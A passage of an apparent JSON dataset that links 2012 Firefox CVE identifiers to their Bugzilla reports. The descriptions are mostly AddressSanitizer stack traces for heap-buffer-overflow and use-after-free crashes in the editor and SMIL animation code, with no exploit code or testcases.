char const*, bool, bool, bool) src/editor/composer/src/nsEditingSession.cpp:173 #7 0x7fdf84861d10 in nsHTMLDocument::EditingStateChanged() src/content/html/document/src/nsHTMLDocument.cpp:2693 #8 0x7fdf8485f249 in nsHTMLDocument::BeginLoad() src/content/html/document/src/nsHTMLDocument.cpp:880 #9 0x7fdf862fcfe2 in nsHtml5TreeOpExecutor::WillBuildModel(nsDTDMode) src/parser/html/nsHtml5TreeOpExecutor.cpp:116 #10 0x7fdf860ef40b in nsHtml5Parser::Parse(nsAString_internal const&, void*, nsACString_internal const&, bool, nsDTDMode) src/parser/html/nsHtml5Parser.cpp:231 #11 0x7fdf8487780f in nsHTMLDocument::Close() src/content/html/document/src/nsHTMLDocument.cpp:1606 #12 0x7fdf84877bdb in non-virtual thunk to nsHTMLDocument::Close() src/build/unix/stdc++compat/stdc++compat.cpp:0 #13 0x7fdf8c8db397 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #14 0x7fdf87ea770e in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3117 #15 0x7fdf87f0a3a5 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1480 #16 0x7fdf93436b91 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:389 #17 0x7fdf92cd1ffc in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 #18 0x7fdf9343c54b in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) src/js/src/jsinterp.cpp:396 #19 0x7fdf938b0f9c in js::IndirectProxyHandler::call(JSContext*, JSObject*, unsigned int, JS::Value*) src/js/src/jsproxy.cpp:477 #20 0x7fdf94071a40 in js::DirectWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) src/js/src/jswrapper.cpp:318 #21 0x7fdf9408672d in js::CrossCompartmentWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) src/js/src/jswrapper.cpp:731 #22 0x7fdf94086d54 in non-virtual thunk to js::CrossCompartmentWrapper::call(JSContext*, JSObject*, unsigned int, JS::Value*) ??:0 #23 0x7fdf938f5977 in js::Proxy::call(JSContext*, JSObject*, unsigned int, JS::Value*) src/js/src/jsproxy.cpp:1320 #24 0x7fdf9391020c in proxy_Call(JSContext*, unsigned int, JS::Value*) src/js/src/jsproxy.cpp:1856 #25 0x7fdf9343650d in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:389 #26 0x7fdf933c3ab0 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2413 #27 0x7fdf9332aa35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:309 #28 0x7fdf93437205 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) src/js/src/jsinterp.cpp:363 #29 0x7fdf92cd1ffd in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) src/js/src/jsinterp.h:119 previously allocated by thread T0 here: #0 0x4c3e40 in __interceptor_malloc ??:0 #1 0x7fdf99a756c6 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 #2 0x7fdf8649055f in operator new(unsigned long) src/../../../dist/include/mozilla/mozalloc.h:200 #3 0x7fdf89b04aae in nsEditingSession::SetupEditorOnWindow(nsIDOMWindow*) src/editor/composer/src/nsEditingSession.cpp:460 #4 0x7fdf89afa507 in nsEditingSession::MakeWindowEditable(nsIDOMWindow*, char const*, bool, bool, bool) src/editor/composer/src/nsEditingSession.cpp:173 #5 0x7fdf84861d10 in nsHTMLDocument::EditingStateChanged() src/content/html/document/src/nsHTMLDocument.cpp:2693 #6 0x7fdf8488dc6c in nsHTMLDocument::SetDesignMode(nsAString_internal const&) src/content/html/document/src/nsHTMLDocument.cpp:2834 #7 0x7fdf88721cde in nsIDOMHTMLDocument_SetDesignMode(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:13862 #8 0x7fdf936b2903 in js::CallJSPropertyOpSetter(JSContext*, int (*)(JSContext*, JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>), JS::Handle<JSObject*>, JS::Handle<long>, int, JS::MutableHandle<JS::Value>) src/js/src/jscntxtinlines.h:469 #9 0x7fdf936e7e34 in js::baseops::SetPropertyHelper(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<long>, unsigned int, JS::MutableHandle<JS::Value>, int) src/js/src/jsobj.cpp:4853 #10 0x7fdf9347beb5 in js::SetPropertyOperation(JSContext*, unsigned char*, JS::Handle<JS::Value>, JS::Handle<JS::Value>) src/js/src/jsinterpinlines.h:345 #11 0x7fdf933b6700 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2323 #12 0x7fdf9332aa35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:309 #13 0x7fdf93443ea6 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:494 #14 0x7fdf93445e5e in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:531 #15 0x7fdf92ba0d94 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5723 #16 0x7fdf92ba5d31 in JS_EvaluateUCScriptForPrincipalsVersionOrigin src/js/src/jsapi.cpp:5804 #17 0x7fdf8502aadf in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1506 #18 0x7fdf851daf7f in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9609 #19 0x7fdf851928f9 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9870 #20 0x7fdf851d8fda in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10137 #21 0x7fdf8c81b902 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #22 0x7fdf8c81d1b8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #23 0x7fdf8c7e05ae in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #24 0x7fdf8c4819c8 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 Shadow byte and word: 0x1ffbec83b9d0: fd 0x1ffbec83b9d0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffbec83b9b0: 00 00 00 fb fb fb fb fb 0x1ffbec83b9b8: fb fb fb fb fb fb fb fb 0x1ffbec83b9c0: fa fa fa fa fa fa fa fa 0x1ffbec83b9c8: fa fa fa fa fa fa fa fa =>0x1ffbec83b9d0: fd fd fd fd fd fd fd fd 0x1ffbec83b9d8: fd fd fd fd fd fd fd fd 0x1ffbec83b9e0: fa fa fa fa fa fa fa fa 0x1ffbec83b9e8: fa fa fa fa fa fa fa fa 0x1ffbec83b9f0: 02 fb fb fb fb fb fb fb Stats: 235M malloced (268M for red zones) by 475854 calls Stats: 41M realloced by 21216 calls Stats: 202M freed by 245094 calls Stats: 69M really freed by 155750 calls Stats: 440M (112717 full pages) mmaped in 110 calls mmaps by size class: 8:278511; 9:40955; 10:16380; 11:14329; 12:3072; 13:1536; 14:1280; 15:256; 16:448; 17:1248; 18:144; 19:40; 20:16; mallocs by size class: 8:385323; 9:48551; 10:16749; 11:16755; 12:2604; 13:1970; 14:1504; 15:316; 16:520; 17:1336; 18:168; 19:42; 20:16; frees by size class: 8:172072; 9:39112; 10:13415; 11:13609; 12:1698; 13:1660; 14:1305; 15:271; 16:462; 17:1323; 18:115; 19:39; 20:13; rfrees by size class: 8:116704; 9:19801; 10:7916; 11:9035; 12:580; 13:511; 14:395; 15:147; 16:339; 17:288; 18:28; 19:5; 20:1; Stats: malloc large: 1562 small slow: 2104 ==5528== ABORTING"
      }
    ],
    "CVE-2012-4180": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=785720",
        "title": "Heap-buffer-overflow in nsHTMLEditor::IsPrevCharInNodeWhitespace",
        "description": "Reproduces on trunk 20120825191419 http://hg.mozilla.org/mozilla-central/rev/e874475efe15 ================================================================= ==30534== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f5f56a1dc9d at pc 0x7f5f78caed33 bp 0x7fffd1793670 sp 0x7fffd1793668 READ of size 1 at 0x7f5f56a1dc9d thread T0 #0 0x7f5f78caed32 in nsTextFragment::CharAt(int) const src/layout/base/../../content/base/src/nsTextFragment.h:178 #1 0x7f5f7ddfe7cf in nsHTMLEditor::IsPrevCharInNodeWhitespace(nsIContent*, int, bool*, bool*, nsIContent**, int*) src/editor/libeditor/html/nsHTMLEditor.cpp:901 #2 0x7f5f7dfe2654 in nsHTMLEditRules::GetPromotedPoint(nsHTMLEditRules::RulesEndpoint, nsIDOMNode*, int, EditAction, nsCOMPtr<nsIDOMNode>*, int*) src/editor/libeditor/html/nsHTMLEditRules.cpp:5240 #3 0x7f5f7def0402 in nsHTMLEditRules::PromoteRange(nsIDOMRange*, EditAction) src/editor/libeditor/html/nsHTMLEditRules.cpp:5492 #4 0x7f5f7deeaaa2 in nsHTMLEditRules::AfterEditInner(EditAction, short) src/editor/libeditor/html/nsHTMLEditRules.cpp:430 #5 0x7f5f7dee8d90 in nsHTMLEditRules::AfterEdit(EditAction, short) src/editor/libeditor/html/nsHTMLEditRules.cpp:376 #6 0x7f5f7de57aac in nsHTMLEditor::EndOperation() src/editor/libeditor/html/nsHTMLEditor.cpp:3513 #7 0x7f5f7d899f1c in ~nsAutoRules src/editor/libeditor/base/nsEditorUtils.h:95 #8 0x7f5f7d877ba2 in ~nsAutoRules src/editor/libeditor/base/nsEditorUtils.h:92 #9 0x7f5f7d87dafc in nsPlaintextEditor::InsertText(nsAString_internal const&) src/editor/libeditor/text/nsPlaintextEditor.cpp:728 #10 0x7f5f7d87df1e in non-virtual thunk to nsPlaintextEditor::InsertText(nsAString_internal const&) src/build/unix/stdc++compat/stdc++compat.cpp:0 #11 0x7f5f7d9995d8 in nsInsertPlaintextCommand::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/editor/libeditor/base/nsEditorCommands.cpp:846 #12 0x7f5f80c790d1 in nsControllerCommandTable::DoCommandParams(char const*, nsICommandParams*, nsISupports*) src/embedding/components/commandhandler/src/nsControllerCommandTable.cpp:175 #13 0x7f5f80c4c3a2 in nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) src/embedding/components/commandhandler/src/nsBaseCommandController.cpp:153 #14 0x7f5f80c4c676 in non-virtual thunk to nsBaseCommandController::DoCommandWithParams(char const*, nsICommandParams*) src/build/unix/stdc++compat/stdc++compat.cpp:0 #15 0x7f5f80c62c8f in nsCommandManager::DoCommand(char const*, nsICommandParams*, nsIDOMWindow*) src/embedding/components/commandhandler/src/nsCommandManager.cpp:234 #16 0x7f5f7c1e9498 in nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/content/html/document/src/nsHTMLDocument.cpp:3232 #17 0x7f5f7c1eaded in non-virtual thunk to nsHTMLDocument::ExecCommand(nsAString_internal const&, bool, nsAString_internal const&, bool*) src/build/unix/stdc++compat/stdc++compat.cpp:0 #18 0x7f5f8438cef7 in NS_InvokeByIndex_P src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #19 0x7f5f7f801e5e in CallMethodHelper::Invoke() src/js/xpconnect/src/XPCWrappedNative.cpp:3106 #20 0x7f5f7f8649f5 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1478 #21 0x7f5f8aeeb731 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:372 #22 0x7f5f8ae78821 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2413 #23 0x7f5f8addf815 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:309 #24 0x7f5f8aef8a46 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:494 #25 0x7f5f8aefa9fe in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:531 #26 0x7f5f8a652034 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5665 #27 0x7f5f8a656fd1 in JS_EvaluateUCScriptForPrincipalsVersionOrigin src/js/src/jsapi.cpp:5746 #28 0x7f5f7c981e3f in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1497 #29 0x7f5f7cb319cf in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9590 #30 0x7f5f7cae9349 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9851 #31 0x7f5f7cb2fa2a in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10118 #32 0x7f5f842ccbc2 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #33 0x7f5f842ce478 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #34 0x7f5f84291f99 in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:625 #35 0x7f5f83f34017 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #36 0x7f5f82d10bd5 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #37 0x7f5f8453ea79 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #38 0x7f5f8453e8c2 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #39 0x7f5f8453e7a7 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #40 0x7f5f821dadee in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #41 0x7f5f80e4dc88 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #42 0x7f5f776596f0 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3800 #43 0x7f5f7765f964 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3877 #44 0x7f5f77662a2e in XRE_main src/toolkit/xre/nsAppRunner.cpp:3953 #45 0x40c5bb in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #46 0x409e1f in main src/browser/app/nsBrowserApp.cpp:279 #47 0x7f5f9470ac4d in ?? ??:0 0x7f5f56a1dc9d is located 0 bytes to the right of 1053-byte region [0x7f5f56a1d880,0x7f5f56a1dc9d) allocated by thread T0 here: #0 0x4c3ef0 in __interceptor_malloc ??:0 #1 0x7f5f915a86c6 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 #2 0x7f5f843106d2 in NS_Alloc_P src/xpcom/base/nsMemoryImpl.cpp:163 #3 0x7f5f777ad7d2 in nsMemory::Alloc(unsigned long) src/../../../dist/include/nsMemory.h:36 #4 0x7f5f7acbea88 in nsTextFragment::SetTo(unsigned short const*, int, bool) src/content/base/src/nsTextFragment.cpp:264 #5 0x7f5f7aa69561 in nsGenericDOMDataNode::SetTextInternal(unsigned int, unsigned int, unsigned short const*, unsigned int, bool, CharacterDataChangeInfo::Details*) src/content/base/src/nsGenericDOMDataNode.cpp:307 #6 0x7f5f7aa776f8 in nsGenericDOMDataNode::SetText(unsigned short const*, unsigned int, bool) src/content/base/src/nsGenericDOMDataNode.cpp:850 #7 0x7f5f78bda486 in nsIContent::SetText(nsAString_internal const&, bool) src/../../../../dist/include/nsIContent.h:513 #8 0x7f5f7a487a84 in CompressWhitespace(nsIContent*) src/layout/mathml/nsMathMLTokenFrame.cpp:98 #9 0x7f5f7a4872dc in nsMathMLTokenFrame::Init(nsIContent*, nsIFrame*, nsIFrame*) src/layout/mathml/nsMathMLTokenFrame.cpp:111 #10 0x7f5f78beb992 in nsCSSFrameConstructor::InitAndRestoreFrame(nsFrameConstructorState const&, nsIContent*, nsIFrame*, nsIFrame*, nsIFrame*, bool) src/layout/base/nsCSSFrameConstructor.cpp:4545 #11 0x7f5f78c1b334 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsIFrame*, nsFrameItems&) src/layout/base/nsCSSFrameConstructor.cpp:3647 #12 0x7f5f78c33520 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsIFrame*, nsFrameItems&) src/layout/base/nsCSSFrameConstructor.cpp:5551 #13 0x7f5f78bec989 in nsCSSFrameConstructor::ConstructFramesFromItemList(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList&, nsIFrame*, nsFrameItems&) src/layout/base/nsCSSFrameConstructor.cpp:9817 #14 0x7f5f78beeb58 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsIFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) src/layout/base/nsCSSFrameConstructor.cpp:9961 #15 0x7f5f78c04094 in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsStyleDisplay const*, nsIContent*, nsIFrame*, nsIFrame*, nsStyleContext*, nsIFrame**, nsFrameItems&, bool, PendingBinding*) src/layout/base/nsCSSFrameConstructor.cpp:11008 #16 0x7f5f78c27c40 in nsCSSFrameConstructor::ConstructNonScrollableBlock(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, nsIFrame*, nsStyleDisplay const*, nsFrameItems&, nsIFrame**) src/layout/base/nsCSSFrameConstructor.cpp:4522 #17 0x7f5f78c1a74e in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsIFrame*, nsFrameItems&) src/layout/base/nsCSSFrameConstructor.cpp:3611 #18 0x7f5f78c33520 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsIFrame*, nsFrameItems&) src/layout/base/nsCSSFrameConstructor.cpp:5551 #19 0x7f5f78bec989 in nsCSSFrameConstructor::ConstructFramesFromItemList(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList&, nsIFrame*, nsFrameItems&) src/layout/base/nsCSSFrameConstructor.cpp:9817 #20 0x7f5f78c50f02 in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) src/layout/base/nsCSSFrameConstructor.cpp:7218 #21 0x7f5f78c4a8fa in nsCSSFrameConstructor::ContentInserted(nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) src/layout/base/nsCSSFrameConstructor.cpp:6837 #22 0x7f5f78c3af4d in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, bool) src/layout/base/nsCSSFrameConstructor.cpp:9341 #23 0x7f5f78c6a537 in nsCSSFrameConstructor::ProcessRestyledFrames(nsStyleChangeList&) src/layout/base/nsCSSFrameConstructor.cpp:8084 #24 0x7f5f78bbb933 in mozilla::css::RestyleTracker::ProcessOneRestyle(mozilla::dom::Element*, nsRestyleHint, nsChangeHint) src/layout/base/RestyleTracker.cpp:132 Shadow byte and word: 0x1febead43b93: 5 0x1febead43b90: 00 00 00 05 fb fb fb fb More shadow bytes: 0x1febead43b70: 00 00 00 00 00 00 00 00 0x1febead43b78: 00 00 00 00 00 00 00 00 0x1febead43b80: 00 00 00 00 00 00 00 00 0x1febead43b88: 00 00 00 00 00 00 00 00 =>0x1febead43b90: 00 00 00 05 fb fb fb fb 0x1febead43b98: fb fb fb fb fb fb fb fb 0x1febead43ba0: fa fa fa fa fa fa fa fa 0x1febead43ba8: fa fa fa fa fa fa fa fa 0x1febead43bb0: fa fa fa fa fa fa fa fa Stats: 238M malloced (274M for red zones) by 500040 calls Stats: 42M realloced by 21762 calls Stats: 203M freed by 265667 calls Stats: 71M really freed by 156628 calls Stats: 448M (114766 full pages) mmaped in 112 calls mmaps by size class: 8:294894; 9:40955; 10:16380; 11:14329; 12:3072; 13:1536; 14:1280; 15:256; 16:448; 17:1248; 18:160; 19:40; 20:16; mallocs by size class: 8:406418; 9:50541; 10:17092; 11:17141; 12:2998; 13:1978; 14:1488; 15:324; 16:525; 17:1297; 18:179; 19:42; 20:17; frees by size class: 8:189390; 9:41298; 10:13781; 11:13967; 12:2077; 13:1668; 14:1286; 15:282; 16:466; 17:1284; 18:115; 19:39; 20:14; rfrees by size class: 8:117290; 9:19910; 10:7974; 11:9114; 12:582; 13:521; 14:398; 15:147; 16:339; 17:319; 18:28; 19:5; 20:1; Stats: malloc large: 1535 small slow: 2173 ==30534== ABORTING"
      }
    ],
    "CVE-2012-4181": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=786111",
        "title": "Heap-use-after-free in nsSMILAnimationController::DoSample",
        "description": "Reproduces on trunk. Reliable reproduce this by launching multiple instances of firefox with the same testcase. on my fast box, i needed like 15. ================================================================= ==10320== ERROR: AddressSanitizer heap-use-after-free on address 0x7f2197da95d0 at pc 0x7f21c591cd12 bp 0x7ffff4c086b0 sp 0x7ffff4c086a8 READ of size 4 at 0x7f2197da95d0 thread T0 #0 0x7f21c591cd11 in PL_DHashTableEnumerate src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:714 #1 0x7f21c0d411d2 in nsTHashtable<nsSMILCompositor>::EnumerateEntries(PLDHashOperator (*)(nsSMILCompositor*, void*), void*) src/../../dist/include/nsTHashtable.h:237 #2 0x7f21c0d43762 in nsSMILAnimationController::DoSample(bool) src/content/smil/nsSMILAnimationController.cpp:437 #3 0x7f21baadbc47 in nsSMILAnimationController::Resample() src/../../../../dist/include/nsSMILAnimationController.h:66 #4 0x7f21baa4930d in nsSMILAnimationController::FlushResampleRequests() src/../../../../dist/include/nsSMILAnimationController.h:84 #5 0x7f21baa47fbe in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3846 #6 0x7f21bb16d5aa in nsHideViewer::Run() src/layout/generic/nsSubDocumentFrame.cpp:810 #7 0x7f21bc09650d in nsContentUtils::RemoveScriptBlocker() src/content/base/src/nsContentUtils.cpp:4961 #8 0x7f21ba679a3a in ~nsAutoScriptBlocker src/../../../dist/include/nsContentUtils.h:2276 #9 0x7f21ba664432 in ~nsAutoScriptBlocker src/../../../dist/include/nsContentUtils.h:2275 #10 0x7f21bc2a34a1 in nsDocument::AdoptNode(nsIDOMNode*, nsIDOMNode**) src/content/base/src/nsDocument.cpp:6227 #11 0x7f21c133969d in nsIDOMDocument_AdoptNode(JSContext*, unsigned int, JS::Value*) src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:3467 #12 0x7f21cc8bf951 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) src/js/src/jscntxtinlines.h:372 #13 0x7f21cc84ca41 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) src/js/src/jsinterp.cpp:2413 #14 0x7f21cc7b3a35 in js::RunScript(JSContext*, JSScript*, js::StackFrame*) src/js/src/jsinterp.cpp:309 #15 0x7f21cc8ccc66 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) src/js/src/jsinterp.cpp:494 #16 0x7f21cc8cec1e in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) src/js/src/jsinterp.cpp:531 #17 0x7f21cc026334 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) src/js/src/jsapi.cpp:5665 #18 0x7f21cc02b2d1 in JS_EvaluateUCScriptForPrincipalsVersionOrigin src/js/src/jsapi.cpp:5746 #19 0x7f21be34f62f in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) src/dom/base/nsJSEnvironment.cpp:1497 #20 0x7f21be4ff1bf in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) src/dom/base/nsGlobalWindow.cpp:9590 #21 0x7f21be4b6b39 in nsGlobalWindow::RunTimeout(nsTimeout*) src/dom/base/nsGlobalWindow.cpp:9851 #22 0x7f21be4fd21a in nsGlobalWindow::TimerCallback(nsITimer*, void*) src/dom/base/nsGlobalWindow.cpp:10118 #23 0x7f21c5ca0d22 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:473 #24 0x7f21c5ca25d8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #25 0x7f21c5c659ce in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #26 0x7f21c5906e27 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #27 0x7f21c46e3595 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #28 0x7f21c5f12bd9 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #29 0x7f21c5f12a22 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #30 0x7f21c5f12907 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #31 0x7f21c3bad7ae in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #32 0x7f21c281e448 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #33 0x7f21b90259b0 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3800 #34 0x7f21b902bc24 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3877 #35 0x7f21b902ecee in XRE_main src/toolkit/xre/nsAppRunner.cpp:3953 #36 0x40c5bb in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #37 0x409e1f in main src/browser/app/nsBrowserApp.cpp:279 #38 0x7f21d60e6c4d in ?? ??:0 0x7f2197da95d0 is located 336 bytes inside of 896-byte region [0x7f2197da9480,0x7f2197da9800) freed by thread T0 here: #0 0x4c3e30 in free ??:0 #1 0x7f21d2f84572 in moz_free src/memory/mozalloc/mozalloc.cpp:51 #2 0x7f21c59125d0 in PL_DHashFreeTable src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:88 #3 0x7f21c5915ae1 in PL_DHashTableFinish src/objdir-ff-asan-sym/xpcom/build/pldhash.cpp:370 #4 0x7f21c0d533f1 in ~nsTHashtable src/../../dist/include/nsTHashtable.h:384 #5 0x7f21c0d53272 in ~nsTHashtable src/../../dist/include/nsTHashtable.h:382 #6 0x7f21c0d53093 in nsAutoPtr<nsTHashtable<nsSMILCompositor> >::assign(nsTHashtable<nsSMILCompositor>*) src/../../dist/include/nsAutoPtr.h:38 #7 0x7f21c0d416f7 in nsAutoPtr<nsTHashtable<nsSMILCompositor> >::operator=(nsTHashtable<nsSMILCompositor>*) src/../../dist/include/nsAutoPtr.h:101 #8 0x7f21c0d43816 in nsSMILAnimationController::DoSample(bool) src/content/smil/nsSMILAnimationController.cpp:449 #9 0x7f21c0d42e97 in nsSMILAnimationController::DoSample() src/content/smil/nsSMILAnimationController.cpp:351 #10 0x7f21c0db7c95 in nsSMILTimeContainer::Sample() src/content/smil/nsSMILTimeContainer.cpp:176 #11 0x7f21c0d3e5c6 in nsSMILAnimationController::Resume(unsigned int) src/content/smil/nsSMILAnimationController.cpp:94 #12 0x7f21c0d40987 in nsSMILAnimationController::OnPageShow() src/content/smil/nsSMILAnimationController.cpp:193 #13 0x7f21bc2bf2a8 in nsDocument::OnPageShow(bool, nsIDOMEventTarget*) src/content/base/src/nsDocument.cpp:7306 #14 0x7f21ba862325 in DocumentViewerImpl::LoadComplete(unsigned int) src/layout/base/nsDocumentViewer.cpp:1045 #15 0x7f21c229a6da in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, unsigned int) src/docshell/base/nsDocShell.cpp:6415 #16 0x7f21c22925e5 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, unsigned int) 